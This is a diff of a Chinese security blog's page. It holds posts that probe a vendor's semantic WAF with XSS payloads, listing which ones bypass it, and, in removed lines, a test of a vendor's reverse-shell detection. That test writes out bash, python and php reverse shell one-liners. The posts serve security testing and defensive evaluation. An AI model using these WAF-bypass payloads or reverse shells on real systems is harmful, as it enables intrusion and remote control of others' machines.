函数名是否在黑名单中</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:a&#x3D;alert;a(1);  拦截</span><br><span class="line">a&#x3D;javascript:a&#x3D;alert;b(1);  拦截   似乎逻辑是 危险函数赋值 &amp;&amp; 调用函数</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:a&#x3D;console;b&#96;1&#96;;  拦截</span><br><span class="line">a&#x3D;javascript:a&#x3D;console;b(1);  拦截</span><br><span class="line">a&#x3D;javascript:a&#x3D;&#x2F;**&#x2F;console;b&#96;1&#96;;   拦截 可以确认拦截逻辑是  危险函数赋值 &amp;&amp; 调用函数</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:alert(&quot;1&quot;)  拦截</span><br><span class="line">a&#x3D;javascript:alert?.(&quot;1&quot;)  应该拦截，但是没有拦截。  说明这里做了js语法解析，且解析器没有支持最新的js语法</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:console()  不拦截</span><br><span class="line">a&#x3D;javascript:console();xxx.xx()  拦截    </span><br><span class="line">a&#x3D;javascript:consolexxaa();xxx.xx 不拦截   说明只有存在 对象.函数()形式的函数调用 &amp;&amp; 对象名在黑名单中  </span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:window&#x3D;xxx;xxx.xx()   不拦截</span><br><span class="line">a&#x3D;javascript:xxx&#x3D;window;xxx.xx()   拦截    可以确认拦截逻辑是 危险对象赋值 &amp;&amp; 调用函数</span><br></pre></td></tr></table></figure>
+
+<p>小结：</p>
+<ul>
+<li>解析js &amp;&amp; 是否存在”函数()”形式的函数调用 &amp;&amp; 获取调用函数名 &amp;&amp; 函数名在黑名单中（前缀匹配） 则拦截</li>
+<li>解析js &amp;&amp; 是否存在”对象.函数()”形式的函数调用 &amp;&amp; 获取函数名、对象名 &amp;&amp; 将危险对象名扩充到黑名单中 &amp;&amp; (函数名在黑名单中 || 对象名在对象黑名单中)   则拦截</li>
+<li>解析js &amp;&amp; (危险对象赋值 || 危险函数赋值) &amp;&amp; 调用函数    则拦截</li>
+</ul>
+<h2 id="js代码"><a href="#js代码" class="headerlink" title="js代码"></a>js代码</h2><p>攻击场景是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;用户输出点&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert()   拦截</span><br><span class="line">a&#x3D;xxxxx()   不拦截  说明逻辑是 是否存在函数调用 &amp;&amp; 函数名是否在黑名单中</span><br><span class="line">a&#x3D;x&#x3D;alert;x(1);   应该拦截，但是没有拦截。   说明这里没有&quot;危险函数赋值 &amp;&amp; 调用函数&quot;的检测逻辑</span><br><span class="line">a&#x3D;console.log(11)   应该拦截，但是也没有拦截   说明没有拦截&quot;危险对象&quot;</span><br><span class="line">xxxx.alert(11)   拦截    确认逻辑是 是否存在函数调用 &amp;&amp; 函数名是否在黑名单中</span><br></pre></td></tr></table></figure>
+
+<p>小结:</p>
+<ul>
+<li>解析js &amp;&amp; 存在”对象.函数()”形式或者”函数()”函数形式的函数调用 &amp;&amp; 函数名是否在黑名单中   则拦截</li>
+</ul>
+<h2 id="data-text-html"><a href="#data-text-html" class="headerlink" title="data:text/html"></a>data:text/html</h2><p>攻击场景是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;用户输出可控点&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>测试过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:text&#x2F;html;base64;PGltZy9vbmxvYWQ9eHg  不拦截</span><br><span class="line"></span><br><span class="line">data:text&#x2F;html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+   应该拦截，但是没有拦截. 说明不拦截这种利用场景</span><br></pre></td></tr></table></figure>
+<p>小结：不拦截</p>
+<h2 id="script脚本地址-script标签"><a href="#script脚本地址-script标签" class="headerlink" title="script脚本地址 (script标签)"></a>script脚本地址 (script标签)</h2><p>攻击场景是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;用户输出点&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;a.js  应该拦截，但是没有拦截. 说明不拦截这种攻击场景</span><br></pre></td></tr></table></figure>
+<p>小结：不拦截</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>拦截策略，可能是：</p>
+<ul>
+<li>解析js &amp;&amp; 是否存在”函数()”形式的函数调用 &amp;&amp; 获取调用函数名 &amp;&amp; 函数名在黑名单中（前缀匹配） 则拦截</li>
+<li>解析js &amp;&amp; 是否存在”对象.函数()”形式的函数调用 &amp;&amp; 获取函数名、对象名 &amp;&amp; 将危险对象名扩充到黑名单中 &amp;&amp; (函数名在黑名单中 || 对象名在对象黑名单中)   则拦截</li>
+<li>解析js &amp;&amp; (危险对象赋值 || 危险函数赋值) &amp;&amp; 调用函数    则拦截</li>
+<li>解析js &amp;&amp; 存在”对象.函数()”形式或者”函数()”函数形式的函数调用 &amp;&amp; 函数名是否在黑名单中   则拦截</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(4)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -411,137 +798,6 @@
 </ul>
 </li>
 <li>有一些payload被拦截的原因目前无法解释</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(3)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(3)/" class="post-title-link" itemprop="url">细品某语义waf的xss防护(3)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><ul>
-<li>经过前期调研，标签中下面的危险属性可以用来做xss攻击：<ul>
-<li>href属性</li>
-<li>src属性</li>
-<li>on事件属性</li>
-<li>srcdoc属性</li>
-<li>xlink:href</li>
-<li>action</li>
-<li>formaction</li>
-<li>data (object标签)</li>
-</ul>
-</li>
-</ul>
-<p>假设攻击场景如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">漏洞输出位置是 &lt;标签 危险属性&#x3D;&quot;用户输出可控位置&quot;&gt;，比如：</span><br><span class="line">&lt;a href&#x3D;&quot;用户输出可控位置&quot;&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;用户输出可控位置&quot;&gt;</span><br><span class="line"></span><br><span class="line">攻击者不闭合属性值时利用xss攻击,如:</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>经过前期调研，在属性值中有下面这些利用方式：</p>
-<ul>
-<li>javascript:js代码</li>
-<li>js代码   （on事件属性）</li>
-<li>data:text/html</li>
-<li>script脚本地址 (script标签的src属性)</li>
-</ul>
-<p>在这个场景下，不考虑其他的利用手段，验证厂商语义waf的安全防护策略</p>
-<p>分析思路：</p>
-<ul>
-<li>针对在属性中每一种利用方式测试，根据拦截情况推测安全防护策略</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="javascript-js代码"><a href="#javascript-js代码" class="headerlink" title="javascript:js代码"></a>javascript:js代码</h2><p>攻击场景是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&#x2F;href&#x3D;&quot;用户输出可控点&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>测试过程</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;javascript:console.xxx()   拦截</span><br><span class="line">a&#x3D;javascript:console.log(111);xx&#123;&#96;faji(   不拦截  说明判断了js语法是否正确</span><br><span class="line">a&#x3D;javascript:xxx.consol(11)  不拦截</span><br><span class="line">a&#x3D;javascript:xxx.console(11)  拦截   说明危险对象和危险函数一样，在同一个黑名单里。</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:xxx.consoleeee(11)    拦截</span><br><span class="line">a&#x3D;javascript:xxx.xxxconsoleeee(11) 不拦截  说明判断是否在黑名单中采用前缀判断</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:xxxxx()   不拦截</span><br><span class="line">a&#x3D;javascript:alertxxx(11) 拦截</span><br><span class="line">a&#x3D;javascript:alert()   拦截   说明逻辑是 是否存在函数调用 &amp;&amp; 函数名是否在黑名单中</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:a&#x3D;alert;a(1);  拦截</span><br><span class="line">a&#x3D;javascript:a&#x3D;alert;b(1);  拦截   似乎逻辑是 危险函数赋值 &amp;&amp; 调用函数</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:a&#x3D;console;b&#96;1&#96;;  拦截</span><br><span class="line">a&#x3D;javascript:a&#x3D;console;b(1);  拦截</span><br><span class="line">a&#x3D;javascript:a&#x3D;&#x2F;**&#x2F;console;b&#96;1&#96;;   拦截 可以确认拦截逻辑是  危险函数赋值 &amp;&amp; 调用函数</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:alert(&quot;1&quot;)  拦截</span><br><span class="line">a&#x3D;javascript:alert?.(&quot;1&quot;)  应该拦截，但是没有拦截。  说明这里做了js语法解析，且解析器没有支持最新的js语法</span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:console()  不拦截</span><br><span class="line">a&#x3D;javascript:console();xxx.xx()  拦截    </span><br><span class="line">a&#x3D;javascript:consolexxaa();xxx.xx 不拦截   说明只有存在 对象.函数()形式的函数调用 &amp;&amp; 对象名在黑名单中  </span><br><span class="line"></span><br><span class="line">a&#x3D;javascript:window&#x3D;xxx;xxx.xx()   不拦截</span><br><span class="line">a&#x3D;javascript:xxx&#x3D;window;xxx.xx()   拦截    可以确认拦截逻辑是 危险对象赋值 &amp;&amp; 调用函数</span><br></pre></td></tr></table></figure>
-
-<p>小结：</p>
-<ul>
-<li>解析js &amp;&amp; 是否存在”函数()”形式的函数调用 &amp;&amp; 获取调用函数名 &amp;&amp; 函数名在黑名单中（前缀匹配） 则拦截</li>
-<li>解析js &amp;&amp; 是否存在”对象.函数()”形式的函数调用 &amp;&amp; 获取函数名、对象名 &amp;&amp; 将危险对象名扩充到黑名单中 &amp;&amp; (函数名在黑名单中 || 对象名在对象黑名单中)   则拦截</li>
-<li>解析js &amp;&amp; (危险对象赋值 || 危险函数赋值) &amp;&amp; 调用函数    则拦截</li>
-</ul>
-<h2 id="js代码"><a href="#js代码" class="headerlink" title="js代码"></a>js代码</h2><p>攻击场景是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;用户输出点&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>测试过程</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert()   拦截</span><br><span class="line">a&#x3D;xxxxx()   不拦截  说明逻辑是 是否存在函数调用 &amp;&amp; 函数名是否在黑名单中</span><br><span class="line">a&#x3D;x&#x3D;alert;x(1);   应该拦截，但是没有拦截。   说明这里没有&quot;危险函数赋值 &amp;&amp; 调用函数&quot;的检测逻辑</span><br><span class="line">a&#x3D;console.log(11)   应该拦截，但是也没有拦截   说明没有拦截&quot;危险对象&quot;</span><br><span class="line">xxxx.alert(11)   拦截    确认逻辑是 是否存在函数调用 &amp;&amp; 函数名是否在黑名单中</span><br></pre></td></tr></table></figure>
-
-<p>小结:</p>
-<ul>
-<li>解析js &amp;&amp; 存在”对象.函数()”形式或者”函数()”函数形式的函数调用 &amp;&amp; 函数名是否在黑名单中   则拦截</li>
-</ul>
-<h2 id="data-text-html"><a href="#data-text-html" class="headerlink" title="data:text/html"></a>data:text/html</h2><p>攻击场景是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;用户输出可控点&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>测试过程</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:text&#x2F;html;base64;PGltZy9vbmxvYWQ9eHg  不拦截</span><br><span class="line"></span><br><span class="line">data:text&#x2F;html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+   应该拦截，但是没有拦截. 说明不拦截这种利用场景</span><br></pre></td></tr></table></figure>
-<p>小结：不拦截</p>
-<h2 id="script脚本地址-script标签"><a href="#script脚本地址-script标签" class="headerlink" title="script脚本地址 (script标签)"></a>script脚本地址 (script标签)</h2><p>攻击场景是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;用户输出点&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>测试过程</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;a.js  应该拦截，但是没有拦截. 说明不拦截这种攻击场景</span><br></pre></td></tr></table></figure>
-<p>小结：不拦截</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>拦截策略，可能是：</p>
-<ul>
-<li>解析js &amp;&amp; 是否存在”函数()”形式的函数调用 &amp;&amp; 获取调用函数名 &amp;&amp; 函数名在黑名单中（前缀匹配） 则拦截</li>
-<li>解析js &amp;&amp; 是否存在”对象.函数()”形式的函数调用 &amp;&amp; 获取函数名、对象名 &amp;&amp; 将危险对象名扩充到黑名单中 &amp;&amp; (函数名在黑名单中 || 对象名在对象黑名单中)   则拦截</li>
-<li>解析js &amp;&amp; (危险对象赋值 || 危险函数赋值) &amp;&amp; 调用函数    则拦截</li>
-<li>解析js &amp;&amp; 存在”对象.函数()”形式或者”函数()”函数形式的函数调用 &amp;&amp; 函数名是否在黑名单中   则拦截</li>
 </ul>
 
       
@@ -1296,205 +1552,6 @@
 <p>另外可以在云厂商控制台上看看云上抗ddos产品的功能和文档，也能了解ddos产品防护策略有哪些，虽然可能不全。</p>
 <p>如果发现内容结论有问题，请后台联系我。</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/nmap/nmap/issues/1904">从nmap的issue看到有人遇到同样问题</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E6%8F%90%E9%AB%98%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%95%88%E7%8E%87%E7%9A%84%E5%B7%A5%E5%85%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E6%8F%90%E9%AB%98%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%95%88%E7%8E%87%E7%9A%84%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">提高漏洞验证效率的工具</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>某个xss漏洞点如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">x&#x3D;document.createElement(&quot;script&quot;);</span><br><span class="line">x.setAttribute(&quot;src&quot;, &quot;用户可控的地址&quot;);</span><br><span class="line">document.body.appendChild(x);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>虽然xss漏洞肯定是存在的，但是我不知道利用起来是不是会有问题，比如碰到csp等。</p>
-<p>所以我在”用户可控地址” 填入 “<a target="_blank" rel="noopener" href="http://x.x.x.x/1.js&quot;">http://x.x.x.x/1.js&quot;</a> 来验证，于是出现了点问题。</p>
-<p>第一个问题：https站点引入http静态资源时，浏览器控制台出现”混合内容”警告。似乎会影响js解析</p>
-<p>第二个问题：响应头的content-type需要是text/javascript，否则不能当作js解析</p>
-<p>所以我需要一个web服务：</p>
-<ul>
-<li>支持https</li>
-<li>返回内容可以自定义</li>
-<li>响应头content-type可以自定义</li>
-<li>支持公网访问</li>
-</ul>
-<p>自己去搭这样一个服务也不难，但是如果有现成的岂不是更好，省时省力。</p>
-<p>根据历史经验，我知道有两种平台似乎可以解决我的这个小需求：</p>
-<ul>
-<li>类似 pastebin 的平台，可以通过短链接访问</li>
-<li>xss平台</li>
-</ul>
-<h1 id="测试这些平台是否好用"><a href="#测试这些平台是否好用" class="headerlink" title="测试这些平台是否好用"></a>测试这些平台是否好用</h1><p><a target="_blank" rel="noopener" href="http://ix.io/">http://ix.io</a> : 不支持https</p>
-<p><a target="_blank" rel="noopener" href="http://pastebin.com/">http://pastebin.com</a>: 不支持设置content-type</p>
-<p>搜索到的很多xss平台，都需要邀请码。甚至有的注册成功了，但是使用起来有问题。</p>
-<p>再比如 xssye.com 这个xss平台我很久以前用过。今天登陆提示账号密码登陆不上，申请密码找回提示邮箱和账号对不上，重新注册又提示”需要注册邀请码”。</p>
-<p>总之试了几个，感觉用着比较难受。这些xss平台看前段页面似乎都是一套代码，也不确定是否可能存在漏洞。</p>
-<h1 id="有没有稳定好用的服务"><a href="#有没有稳定好用的服务" class="headerlink" title="有没有稳定好用的服务"></a>有没有稳定好用的服务</h1><p>想起来云上的文件存储服务，刚好是满足我自己的需求的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl https:&#x2F;&#x2F;webbackup-3knjfg4bxz.bj.bcebos.com&#x2F;1.js</span><br><span class="line">alert(1);</span><br></pre></td></tr></table></figure>
-
-<p>另外云上的函数服务，还可以写代码对响应做更精细的控制。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>云上的 文件存储、函数服务 等很适合快速在公网提供https服务，而且相对于个人自己搭建的服务要稳定省心得多，推荐使用。</p>
-<p>当然云上也有很坑的服务，就不说了。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E6%9F%90%E5%8E%82%E5%95%86%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E9%98%B2%E6%8A%A4%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E6%9F%90%E5%8E%82%E5%95%86%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E9%98%B2%E6%8A%A4%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">某厂商的反弹shell防护能力测试</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>工作任务需要测试某厂商的反弹shell检测安全能力</p>
-<p>测试思路：</p>
-<ol>
-<li>挑选测试样本<ul>
-<li>每一种检测策略挑选对应的1-3个样本</li>
-</ul>
-</li>
-<li>测试过程中<ul>
-<li>如果某一类样本中的任意一个样本未通过测试，就不继续测试同类其他样本</li>
-<li>如果某一类样本完全被拦截，就尝试绕过</li>
-</ul>
-</li>
-</ol>
-<p>测试时需要注意下面的点，可能会影响测试结果</p>
-<ul>
-<li>反弹shell后，是否输入命令</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="挑选测试样本"><a href="#挑选测试样本" class="headerlink" title="挑选测试样本"></a>挑选测试样本</h2><p>按照<code>安全项目/HIDS/业务：入侵检测/反弹shell/3.反弹shell检测.md</code>学习的检测策略，每一种检测策略挑选对应的1-3个样本。</p>
-<ol>
-<li><p>bash进程、默认文件描述符指向socket</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>没有bash进程、默认文件描述符不指向socket</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s &#x3D; socket.socket();s.connect((&#39;127.0.0.1&#39;,2222))\nwhile 1:  proc &#x3D; subprocess.Popen(s.recv(1024), stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE,shell&#x3D;True);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>对抗行为（使用其他sh解释器）</p>
-   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,4242);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>对抗行为（修改sh解释器名称）</p>
-<p>   修改bash、sh</p>
-   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;bin&#x2F;bash &#x2F;usr&#x2F;bin&#x2F;x; x -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1      &#x2F;&#x2F; x是bash</span><br><span class="line"></span><br><span class="line">cp &#x2F;usr&#x2F;bin&#x2F;sh &#x2F;usr&#x2F;bin&#x2F;y; 0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;4242; y &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196  &#x2F;&#x2F; y是sh</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>1 通过</p>
-<p>2、3、4 不通过</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>  4类样本中，仅检测出1类最基础的反弹shell。</p>
-<p>  在测试过程中发现：</p>
-<ul>
-<li>检测到反弹shell后不会立马告警：厂商会检测shell是否执行命令，如果仅仅反弹shell但是没有执行命令就不会被拦截</li>
-</ul>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Reverse Shell Cheat Sheet</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263684.html">云上威胁检测 | 详解反弹shell多维检测技术</a></p>
 
       
     </div>
